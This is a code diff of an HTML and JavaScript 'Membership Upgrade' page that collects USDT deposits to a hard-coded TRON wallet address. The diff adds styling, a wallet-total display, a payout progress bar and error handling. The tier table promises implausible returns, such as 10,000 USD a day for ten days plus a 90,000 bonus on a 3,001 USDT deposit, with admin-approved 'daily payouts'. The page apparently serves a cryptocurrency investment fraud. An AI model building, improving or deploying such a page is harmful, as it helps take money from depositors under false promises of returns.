@@ -7,13 +7,42 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --bg:#040407; --card:#0f0f14; --muted:#9aa3b2; --accent:#a855f7; --accent2:#5eead4;
+    --bg:#040407; 
+    --card:#0f0f14; 
+    --muted:#9aa3b2; 
+    --accent:#a855f7; 
+    --accent2:#5eead4;
     --glass: rgba(255,255,255,0.03);
+    --danger:#f97373;
+    --success:#7ef6b8;
   }
   *{box-sizing:border-box}
-  body{margin:0;min-height:100vh;background:linear-gradient(180deg,#030305 0%, #07070b 100%);font-family:Inter,system-ui,Segoe UI,Roboto,Arial;color:#eaf3ff}
+  body{
+    margin:0;
+    min-height:100vh;
+    background:
+      radial-gradient(900px 500px at 0% 0%, rgba(168,85,247,0.09), transparent 60%),
+      radial-gradient(900px 500px at 100% 100%, rgba(94,234,212,0.06), transparent 60%),
+      linear-gradient(180deg,#030305 0%, #07070b 100%);
+    font-family:Inter,system-ui,Segoe UI,Roboto,Arial;
+    color:#eaf3ff;
+    overflow-x:hidden;
+  }
   .wrap{max-width:1100px;margin:28px auto;padding:20px}
-  h1{font-size:clamp(1.6rem,4vw,2.2rem); margin:6px 0 18px; background:linear-gradient(90deg,#a855f7,#5eead4); -webkit-background-clip:text; background-clip:text; color:transparent}
+  h1{
+    font-size:clamp(1.6rem,4vw,2.2rem);
+    margin:6px 0 4px;
+    background:linear-gradient(90deg,#a855f7,#5eead4);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+  }
+  .subtitle{
+    color:var(--muted);
+    font-size:0.9rem;
+    margin-bottom:18px;
+  }
+
   .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
   @media(max-width:980px){ .grid{grid-template-columns:repeat(2,1fr)} }
   @media(max-width:640px){ .grid{grid-template-columns:1fr} }
@@ -25,25 +54,79 @@
     position:relative;
     overflow:hidden;
     border:1px solid rgba(255,255,255,0.04);
-    transition:transform .28s cubic-bezier(.2,.9,.3,1), box-shadow .28s;
+    transition:
+      transform .28s cubic-bezier(.2,.9,.3,1),
+      box-shadow .28s,
+      border-color .28s;
     cursor:default;
   }
-  .card:hover{ transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 50px rgba(0,0,0,0.6) }
-  .neon { box-shadow: 0 0 30px rgba(168,85,247,0.08), inset 0 1px 0 rgba(255,255,255,0.02) }
+  .card:hover{ 
+    transform: translateY(-8px) scale(1.02); 
+    box-shadow: 0 22px 60px rgba(0,0,0,0.7);
+    border-color: rgba(168,85,247,0.5);
+  }
+  .card.active {
+    box-shadow:0 0 40px rgba(94,234,212,0.4);
+    border-color:rgba(94,234,212,0.9);
+  }
   .titleRow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
   .tier{font-weight:800;font-size:1.35rem}
   .price{font-weight:700;color:#fff}
   .desc{color:var(--muted);font-size:13px;margin-bottom:12px}
-  .pill{display:inline-block;padding:6px 10px;border-radius:999px;font-weight:700;font-size:12px}
+  .pill{
+    display:inline-block;
+    padding:6px 10px;
+    border-radius:999px;
+    font-weight:700;
+    font-size:12px;
+    background:rgba(255,255,255,0.06);
+  }
+  .pill.live{
+    background:rgba(94,234,212,0.12);
+    color:var(--success);
+  }
+  .pill.none{
+    background:rgba(148,163,184,0.2);
+    color:var(--muted);
+  }
+  .pill.pending{
+    background:rgba(250,204,21,0.16);
+    color:#facc15;
+  }
   .purchase{display:flex;gap:8px;align-items:center;margin-top:auto}
   .btn{
     background:linear-gradient(90deg,var(--accent),var(--accent2));
     border:none;color:#021;padding:10px 12px;border-radius:12px;font-weight:800;cursor:pointer;
-    transition:transform .12s;
+    transition:transform .12s, box-shadow .12s;
+    box-shadow:0 10px 30px rgba(168,85,247,0.3);
   }
-  .btn:hover{transform:scale(1.03)}
-  .ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:8px 10px;border-radius:10px;cursor:pointer}
-  .badgelabel{position:absolute;right:12px;top:12px;padding:6px 10px;border-radius:10px;background:linear-gradient(90deg,#ff6fb3,#7c3aed);font-weight:700;color:#fff;font-size:12px}
+  .btn:hover{transform:scale(1.04); box-shadow:0 16px 40px rgba(168,85,247,0.45);}
+  .btn:active{transform:scale(0.97); box-shadow:none;}
+  .ghost{
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.08);
+    color:var(--muted);
+    padding:8px 10px;
+    border-radius:10px;
+    cursor:pointer;
+    font-weight:600;
+    font-size:0.85rem;
+    transition:.18s;
+  }
+  .ghost:hover{
+    border-color:var(--accent);
+    color:#fff;
+  }
+  .badgelabel{
+    position:absolute;
+    right:12px;top:12px;
+    padding:6px 10px;
+    border-radius:10px;
+    background:linear-gradient(90deg,#ff6fb3,#7c3aed);
+    font-weight:700;
+    color:#fff;
+    font-size:12px;
+  }
 
   .disabledBtn {
     opacity: 0.55;
@@ -52,29 +135,87 @@
   }
 
   /* Modal */
-  .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);z-index:9999}
+  .modal{
+    position:fixed;inset:0;
+    display:none;
+    align-items:center;justify-content:center;
+    background:rgba(0,0,0,0.7);
+    z-index:9999;
+    animation: fadeBg .25s ease-out;
+  }
   .modal.show{display:flex}
-  .modal-card{width:95%;max-width:520px;background:#0b0b0d;padding:20px;border-radius:14px;border:1px solid rgba(255,255,255,0.04)}
+  .modal-card{
+    width:95%;max-width:520px;
+    background:#0b0b0d;
+    padding:20px;
+    border-radius:14px;
+    border:1px solid rgba(255,255,255,0.04);
+    box-shadow:0 30px 80px rgba(0,0,0,0.9);
+    transform:scale(0.94);
+    opacity:0;
+    animation: popIn .25s ease-out forwards;
+  }
   .modal h2{margin:0 0 12px}
-  .qr{width:200px;height:200px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:10px auto;overflow:hidden}
+  .qr{
+    width:200px;height:200px;
+    background:#fff;border-radius:12px;
+    display:flex;align-items:center;justify-content:center;
+    margin:10px auto;
+    overflow:hidden;
+  }
   .addr{word-break:break-all;background:#07070b;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);text-align:center}
   .small{font-size:13px;color:var(--muted)}
   .count{font-weight:800;color:var(--accent);margin-top:8px;text-align:center}
 
-  /* membership + wallet boxes */
   .sidebar{margin-top:20px;padding:16px;border-radius:12px;background:linear-gradient(180deg,#07070b,#0d0d10);border:1px solid rgba(255,255,255,0.03)}
   .row{display:flex;justify-content:space-between;gap:8px;align-items:center;margin-top:10px}
+  .statusBox{
+    padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);
+  }
 
-  .status {padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);}
+  .progressBarWrap{
+    margin-top:10px;
+    width:100%;
+    height:6px;
+    border-radius:999px;
+    background:rgba(15,23,42,0.8);
+    overflow:hidden;
+  }
+  .progressBar{
+    height:100%;
+    border-radius:999px;
+    width:0%;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    transition:width .5s ease-out;
+  }
 
   /* subtle animated shine */
-  .card::after{content:'';position:absolute;left:-40%;top:-20%;width:60%;height:140%;transform:rotate(25deg);background:linear-gradient(90deg,rgba(255,255,255,0.02),rgba(255,255,255,0.06),rgba(255,255,255,0.02));opacity:0;transition:opacity .45s}
+  .card::after{
+    content:'';
+    position:absolute;
+    left:-40%;top:-20%;
+    width:60%;height:140%;
+    transform:rotate(25deg) translateX(-50%);
+    background:linear-gradient(90deg,rgba(255,255,255,0.01),rgba(255,255,255,0.12),rgba(255,255,255,0.01));
+    opacity:0;
+    transition:opacity .45s;
+  }
   .card:hover::after{opacity:1}
+
+  @keyframes popIn{
+    from{transform:scale(0.9) translateY(8px);opacity:0;}
+    to{transform:scale(1) translateY(0);opacity:1;}
+  }
+  @keyframes fadeBg{
+    from{background:rgba(0,0,0,0);}
+    to{background:rgba(0,0,0,0.7);}
+  }
 </style>
 </head>
 <body>
 <div class="wrap">
   <h1>Membership Upgrade</h1>
+  <div class="subtitle">Choose a membership tier to start earning daily payouts and bonus rewards.</div>
 
   <div class="grid" id="tierGrid"></div>
 
@@ -85,18 +226,22 @@
           <div class="small">Your Membership</div>
           <div id="memStatus" style="font-weight:800">Loading...</div>
         </div>
-        <div id="memBadge" class="pill pending">—</div>
+        <div id="memBadge" class="pill none">—</div>
       </div>
       <div id="memDetails" class="small" style="margin-top:10px">—</div>
+      <div class="progressBarWrap" id="memProgressWrap" style="display:none">
+        <div class="progressBar" id="memProgress"></div>
+      </div>
     </div>
 
     <div class="sidebar" style="width:320px;min-width:240px">
-      <div class="small">Your Wallet</div>
+      <div class="small">Your Wallet (Total)</div>
       <div id="wallet" style="font-weight:800;margin-top:6px">Loading...</div>
       <div style="height:10px"></div>
       <div class="small">Quick notes</div>
       <div class="small" style="margin-top:8px;color:var(--muted)">
-        Membership payments are PENDING until admin approves. Once approved, daily payouts start.
+        Membership payments are <strong>PENDING</strong> until admin approves.  
+        Once approved, daily payouts in USD begin automatically.
       </div>
     </div>
   </div>
@@ -138,10 +283,10 @@ const API_BASE = window.location.origin;
 const WALLET_ADDR_TRON = "TAx9KbxS2qh7mwafC3VX6gCGJP8tWVaK9R";
 
 const TIERS = {
-  V1: { deposit: 51, daily:10, days:5, bonus:50, label:'V1' },
-  V2: { deposit: 1498.5, daily:100, days:7, bonus:3000, label:'V2' },
-  V3: { deposit: 3001, daily:10000, days:10, bonus:90000, label:'V3' },
-  V4: { deposit: 29998.5, daily:50000, days:15, bonus:300000, label:'V4' },
+  V1: { deposit: 51,    daily:10,    days:5,  bonus:50,     label:'V1' },
+  V2: { deposit: 1498.5,daily:100,   days:7,  bonus:3000,   label:'V2' },
+  V3: { deposit: 3001,  daily:10000, days:10, bonus:90000,  label:'V3' },
+  V4: { deposit: 29998.5,daily:50000,days:15, bonus:300000, label:'V4' },
   V5: { deposit: 50001, daily:75000, days:30, bonus:500000, label:'V5' }
 };
 
@@ -149,6 +294,7 @@ let selectedTier = null;
 let pendingTxByTier = {};
 let pollTimer = null;
 let pollingTier = null;
+let currentMembershipTier = null;
 
 // DOM
 const tierGrid = document.getElementById('tierGrid');
@@ -165,9 +311,11 @@ const txInfo = document.getElementById('txInfo');
 const memStatus = document.getElementById('memStatus');
 const memDetails = document.getElementById('memDetails');
 const memBadge = document.getElementById('memBadge');
+const memProgressWrap = document.getElementById('memProgressWrap');
+const memProgress = document.getElementById('memProgress');
 const walletEl = document.getElementById('wallet');
 
-// LOGIN CHECK
+// LOGIN CHECK + initial load
 (async function ensureLogin(){
   try {
     const res = await fetch(`${API_BASE}/api/profile`, { credentials:'include' });
@@ -175,12 +323,32 @@ const walletEl = document.getElementById('wallet');
 
     const j = await res.json();
     renderProfile(j.user);
+    await loadWalletUSD();
     renderCards();
-
   } catch (err){
+    console.error("Profile load error on membership:", err);
     location.href="login.html";
   }
 })();
+
+// WALLET TOTAL
+async function loadWalletUSD(){
+  try{
+    const res = await fetch(`${API_BASE}/api/total-usd`, {credentials:'include'});
+    const data = await res.json();
+    if(!data.ok) {
+      walletEl.innerText = "—";
+      return;
+    }
+    walletEl.innerText = "$" + Number(data.totalUSD || 0).toLocaleString(undefined,{
+      minimumFractionDigits:2,
+      maximumFractionDigits:2
+    });
+  }catch(e){
+    console.error("total-usd error:", e);
+    walletEl.innerText = "—";
+  }
+}
 
 // RENDER CARDS
 function renderCards(){
@@ -189,9 +357,10 @@ function renderCards(){
     const t = TIERS[k];
     const hasPending = pendingTxByTier[k];
     const disabled = hasPending ? "disabled disabledBtn" : "";
+    const isCurrent = currentMembershipTier === k;
 
     const div = document.createElement('div');
-    div.className = 'card neon';
+    div.className = 'card neon' + (isCurrent ? ' active' : '');
     div.innerHTML = `
       <div class="badgelabel">${t.label}</div>
       <div class="titleRow">
@@ -199,19 +368,30 @@ function renderCards(){
         <div class="price">${t.deposit.toLocaleString()} USDT</div>
       </div>
 
-      <div class="desc">Daily <strong>${t.daily.toLocaleString()}</strong> · ${t.days} days · Bonus ${t.bonus.toLocaleString()}</div>
+      <div class="desc">
+        Daily <strong>${t.daily.toLocaleString()}</strong> USD · 
+        ${t.days} days · 
+        Bonus ${t.bonus.toLocaleString()} USD
+      </div>
 
       <div class="purchase">
-        <button class="btn ${disabled}" id="buy_${k}" data-tier="${k}">Purchase</button>
-        <button class="ghost" onclick="alert('Daily ${t.daily}, Days ${t.days}, Bonus ${t.bonus}')">Details</button>
+        <button class="btn ${disabled}" id="buy_${k}" data-tier="${k}">
+          ${isCurrent ? "Upgrade Again" : "Purchase"}
+        </button>
+        <button class="ghost" type="button">Details</button>
       </div>
 
       ${hasPending ? `<div class="small" style="color:#facc15;margin-top:8px;">Pending payment for ${k}</div>` : ""}
     `;
 
     tierGrid.appendChild(div);
-    const btn = div.querySelector(`#buy_${k}`);
-    if(btn) btn.onclick = ev => onPurchaseClick(k,ev);
+    const buyBtn = div.querySelector(`#buy_${k}`);
+    const detailBtn = div.querySelector(".ghost");
+
+    if(buyBtn) buyBtn.onclick = ev => onPurchaseClick(k,ev);
+    if(detailBtn) detailBtn.onclick = () => {
+      alert(`Tier ${k}\n\nDaily: ${t.daily} USD\nDuration: ${t.days} days\nBonus: ${t.bonus} USD at completion.`);
+    };
   });
 }
 
@@ -238,7 +418,7 @@ function onPurchaseClick(tier, ev){
   modal.classList.add('show');
 }
 
-// UPDATE QR
+// UPDATE QR (visual only)
 function updateQRandAddr(){
   const coin = coinSel.value;
   if(coin==='USDT'){
@@ -248,12 +428,19 @@ function updateQRandAddr(){
   }
   else{
     addrBox.innerText = coin === 'BTC' ? "Your_BTC_Address" : "Your_ETH_Address";
+    qrBox.innerHTML = `<div style="color:#000;font-weight:700">BTC/ETH</div>`;
   }
 }
 coinSel.addEventListener('change', updateQRandAddr);
 
 // CLOSE MODAL
 closeModal.onclick = ()=> { modal.classList.remove('show'); stopPolling(); }
+modal.addEventListener('click', (e)=>{
+  if(e.target === modal){
+    modal.classList.remove('show');
+    stopPolling();
+  }
+});
 
 // CREATE DEPOSIT
 createDepositBtn.onclick = async ()=>{
@@ -265,6 +452,7 @@ createDepositBtn.onclick = async ()=>{
   }
 
   createDepositBtn.disabled = true;
+  const prev = createDepositBtn.innerText;
   createDepositBtn.innerText="Purchasing...";
 
   const coin = coinSel.value;
@@ -276,14 +464,17 @@ createDepositBtn.onclick = async ()=>{
       credentials:'include',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify({
-        coin,amount,
+        coin,
+        amount,
         membershipTier:selectedTier,
         isMembership:true
       })
     });
 
     const data = await res.json();
-    if(!res.ok) throw new Error(data.error);
+    if(!res.ok || !data.ok){
+      throw new Error(data.error || "Deposit failed");
+    }
 
     const txId = data.txId;
     pendingTxByTier[selectedTier] = txId;
@@ -293,11 +484,12 @@ createDepositBtn.onclick = async ()=>{
     startPollingFor(txId, selectedTier);
 
   }catch(err){
-    txInfo.innerText = err.message;
+    console.error("membership deposit err:", err);
+    txInfo.innerText = err.message || "Failed to create deposit";
   }
 
   createDepositBtn.disabled = false;
-  createDepositBtn.innerText="Purchase Membership";
+  createDepositBtn.innerText = prev;
 };
 
 // MANUAL CHECK
@@ -321,31 +513,38 @@ async function checkStatus(txId=null, tier=null){
   }
   if(!txId) return;
 
-  const res = await fetch(`${API_BASE}/api/verify-payment`,{
-    method:'POST',
-    credentials:'include',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({txId})
-  });
+  try{
+    const res = await fetch(`${API_BASE}/api/verify-payment`,{
+      method:'POST',
+      credentials:'include',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({txId})
+    });
 
-  const data = await res.json();
+    const data = await res.json();
 
-  if(data.status==='CONFIRMED'){
-    txInfo.innerHTML = `<span style="color:#7ef6b8;font-weight:800">✓ Admin confirmed ${tier}</span>`;
-    delete pendingTxByTier[tier];
-    stopPolling();
-    renderCards();
-    refreshProfile();
-    setTimeout(()=> modal.classList.remove('show'),1200);
-  }
-  else if(data.status==='PENDING'){
-    txInfo.innerText = `Status: Pending (${tier})`;
-  }
-  else if(data.status==='DECLINED'){
-    txInfo.innerText = `Declined for ${tier}`;
-    delete pendingTxByTier[tier];
-    stopPolling();
-    renderCards();
+    if(data.status==='CONFIRMED'){
+      txInfo.innerHTML = `<span style="color:#7ef6b8;font-weight:800">✓ Admin confirmed ${tier}</span>`;
+      delete pendingTxByTier[tier];
+      stopPolling();
+      renderCards();
+      await refreshProfile();
+      setTimeout(()=> modal.classList.remove('show'),1200);
+    }
+    else if(data.status==='PENDING'){
+      txInfo.innerText = `Status: Pending (${tier})`;
+    }
+    else if(data.status==='DECLINED'){
+      txInfo.innerText = `Declined for ${tier}`;
+      delete pendingTxByTier[tier];
+      stopPolling();
+      renderCards();
+    } else {
+      txInfo.innerText = "Status: " + (data.status || "Unknown");
+    }
+  }catch(e){
+    console.error("verify-payment error:", e);
+    txInfo.innerText = "Error checking status";
   }
 }
 
@@ -354,30 +553,63 @@ async function refreshProfile(){
   const res = await fetch(`${API_BASE}/api/profile`, {credentials:'include'});
   const j = await res.json();
   renderProfile(j.user);
+  await loadWalletUSD();
 }
 
 function renderProfile(user){
-  walletEl.innerText = (user.balance||0).toFixed(2)+" USD";
-
+  // membership is full object now
   const m = user.membership;
   if(!m){
     memStatus.innerText = "No active membership";
-    memDetails.innerText = "Purchase a membership to begin earning.";
-    memBadge.innerText = "NONE";
+    memDetails.innerText = "Purchase a membership to begin earning daily payouts and bonuses.";
+    memBadge.textContent = "NONE";
+    memBadge.className = "pill none";
+    memProgressWrap.style.display = "none";
+    currentMembershipTier = null;
+    renderCards();
     return;
   }
 
-  memStatus.innerText = `${m.tier} — ${m.status}`;
-  memBadge.innerText = m.status.toUpperCase();
+  currentMembershipTier = m.tier || null;
 
-  memDetails.innerHTML=`
-    Started: ${m.startDate?new Date(m.startDate).toLocaleString():'—'}<br>
-    Days Paid: ${m.daysPaid}/${m.durationDays}<br>
-    Daily: ${m.dailyAmount} USD<br>
-    Bonus Paid: ${m.bonusPaid?'Yes':'No'}
+  memStatus.innerText = `${m.tier || "Tier"} — ${m.status || "ACTIVE"}`;
+  memBadge.textContent = (m.status || "ACTIVE").toUpperCase();
+
+  if(m.status === "ACTIVE"){
+    memBadge.className = "pill live";
+  } else if(m.status === "PENDING"){
+    memBadge.className = "pill pending";
+  } else {
+    memBadge.className = "pill";
+  }
+
+  const start = m.startDate ? new Date(m.startDate).toLocaleString() : '—';
+  const daysPaid = m.daysPaid ?? 0;
+  const totalDays = m.durationDays ?? 0;
+  const dailyAmt = m.dailyAmount ?? 0;
+  const bonus = m.bonusAtMonthEnd ?? 0;
+
+  memDetails.innerHTML = `
+    Started: ${start}<br>
+    Days Paid: ${daysPaid}/${totalDays}<br>
+    Daily Payout: ${dailyAmt} USD<br>
+    Final Bonus: ${bonus} USD<br>
+    Bonus Paid: ${m.bonusPaid ? 'Yes' : 'No'}
   `;
-}
 
+  // progress bar
+  if(totalDays > 0){
+    const pct = Math.max(0, Math.min(100, (daysPaid / totalDays) * 100));
+    memProgressWrap.style.display = "block";
+    requestAnimationFrame(()=>{
+      memProgress.style.width = pct.toFixed(1) + "%";
+    });
+  } else {
+    memProgressWrap.style.display = "none";
+  }
+
+  renderCards();
+}
 </script>
 </body>
 </html>
